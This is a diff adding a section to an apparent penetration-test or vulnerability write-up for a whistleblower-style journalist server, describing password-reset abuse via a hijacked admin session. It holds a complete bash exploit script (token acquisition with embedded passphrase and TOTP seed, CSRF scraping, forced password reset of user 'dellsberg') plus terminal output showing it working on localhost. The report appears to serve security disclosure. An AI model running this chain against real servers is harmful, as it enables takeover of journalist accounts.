@@ -410,8 +410,127 @@ CONFIG_TAMPER_SUCCESS
 
 4. Password reset abuse from admin account for a user account:
    
+Use the following script directly in terminal to reset password for a user level account:
+
+```bash
+BASE=http://127.0.0.1:8081
+PASS='correct horse battery staple profanity oil chewy'
+OTP_SEED='JHCOGO7VCER3EJ4L'
+
+# Fresh admin token
+OTP=$(oathtool --totp --base32 "$OTP_SEED")
+ADMIN_TOKEN=$(curl -sS -X POST "$BASE/api/v1/token" \
+  -H 'Content-Type: application/json' \
+  -d "{\"username\":\"journalist\",\"passphrase\":\"$PASS\",\"one_time_code\":\"$OTP\"}" \
+  | python3 -c 'import sys,json; print(json.load(sys.stdin).get("token",""))')
+
+# Must be 200
+curl -s -o /dev/null -w "admin_token_check=%{http_code}\n" \
+  "$BASE/api/v1/user" -H "Authorization: Token $ADMIN_TOKEN"
+
+# Trigger bug state, then fetch dellsberg user id from admin page
+curl -s "$BASE/api/v1/user" -H "Authorization: Token $ADMIN_TOKEN" >/dev/null
+TARGET_ID=$(curl -s "$BASE/admin/" -H "Cookie: js=$ADMIN_TOKEN" | python3 -c '
+import re,sys
+h=sys.stdin.read()
+m=re.search(r"<th scope=\"row\">\s*dellsberg\s*</th>.*?href=\"/admin/edit/(\d+)\"", h, re.S)
+print(m.group(1) if m else "")
+')
+echo "TARGET_ID=$TARGET_ID"
+
+# Get edit page and extract csrf + generated password
+curl -s "$BASE/api/v1/user" -H "Authorization: Token $ADMIN_TOKEN" >/dev/null
+EDIT_HTML=$(curl -s "$BASE/admin/edit/$TARGET_ID" -H "Cookie: js=$ADMIN_TOKEN")
+
+CSRF_EDIT=$(printf '%s' "$EDIT_HTML" | python3 -c '
+import re,sys
+h=sys.stdin.read()
+m=re.search(r"name=\"csrf_token\"[^>]*value=\"([^\"]+)\"", h) or re.search(r"value=\"([^\"]+)\"[^>]*name=\"csrf_token\"", h)
+print(m.group(1) if m else "")
+')
+NEW_PASS=$(printf '%s' "$EDIT_HTML" | python3 -c '
+import re,sys
+h=sys.stdin.read()
+m=re.search(r"name=\"password\"[^>]*value=\"([^\"]+)\"", h)
+print(m.group(1) if m else "")
+')
+echo "CSRF_LEN=${#CSRF_EDIT} NEW_PASS='$NEW_PASS'"
+
+# Stop if parsing failed
+[ -n "$TARGET_ID" ] && [ -n "$CSRF_EDIT" ] && [ -n "$NEW_PASS" ] || { echo "parse failed"; exit 1; }
+
+# Reset dellsberg password as hijacked admin
+curl -s "$BASE/api/v1/user" -H "Authorization: Token $ADMIN_TOKEN" >/dev/null
+curl -i -s -X POST "$BASE/admin/edit/$TARGET_ID/new-password" \
+  -H "Cookie: js=$ADMIN_TOKEN" \
+  --data-urlencode "csrf_token=$CSRF_EDIT" \
+  --data-urlencode "password=$NEW_PASS" | head -n 15
+
+# Verify old fails, new works
+sleep 31
+OTP=$(oathtool --totp --base32 "$OTP_SEED")
+echo "[old password]"
+curl -i -s -X POST "$BASE/api/v1/token" \
+  -H 'Content-Type: application/json' \
+  -d "{\"username\":\"dellsberg\",\"passphrase\":\"$PASS\",\"one_time_code\":\"$OTP\"}" | head -n 12
+
+sleep 31
+OTP=$(oathtool --totp --base32 "$OTP_SEED")
+echo "[new password]"
+curl -i -s -X POST "$BASE/api/v1/token" \
+  -H 'Content-Type: application/json' \
+  -d "{\"username\":\"dellsberg\",\"passphrase\":\"$NEW_PASS\",\"one_time_code\":\"$OTP\"}" | head -n 12
+
+```
 
 
+My terminal output:
+
+```bash
+admin_token_check=200
+TARGET_ID=2
+CSRF_LEN=91 NEW_PASS='eatery morphing outtakes contrite outdated unelected engraving'
+HTTP/1.1 302 FOUND
+Server: Werkzeug/2.2.3 Python/3.12.3
+Date: Tue, 17 Feb 2026 00:32:44 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 213
+Location: /admin/edit/2
+Connection: close
+
+<!doctype html>
+<html lang=en>
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to the target URL: <a href="/admin/edit/2">/admin/edit/2</a>. If not, click the link.
+[old password]
+HTTP/1.1 403 FORBIDDEN
+Server: Werkzeug/2.2.3 Python/3.12.3
+Date: Tue, 17 Feb 2026 00:33:16 GMT
+Content-Type: application/json
+Content-Length: 73
+Connection: close
+
+{
+  "error": "Forbidden", 
+  "message": "Token authentication failed."
+}
+[new password]
+HTTP/1.1 200 OK
+Server: Werkzeug/2.2.3 Python/3.12.3
+Date: Tue, 17 Feb 2026 00:33:47 GMT
+Content-Type: application/json
+Content-Length: 295
+Connection: close
+
+{
+  "expiration": "2026-02-17T02:33:47.425974+00:00", 
+  "journalist_first_name": null, 
+  "journalist_last_name": null, 
+  "journalist_uuid": "92d08e5f-9116-4023-8dd0-045389dad120", 
+                                                               
+
+```
 ---
 
 ## E. Exploit Chain Possibilities
